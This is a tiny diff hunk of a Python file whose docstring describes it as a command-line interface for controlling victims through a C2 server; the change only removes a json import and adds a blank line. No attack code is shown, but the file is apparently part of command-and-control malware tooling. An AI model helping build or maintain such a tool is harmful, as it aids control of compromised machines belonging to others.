@@ -4,9 +4,9 @@ Command-line interface for controlling victims via C2 server.
 """
 
 import argparse
-import json
 import os
 import sys
+
 import requests
 
 
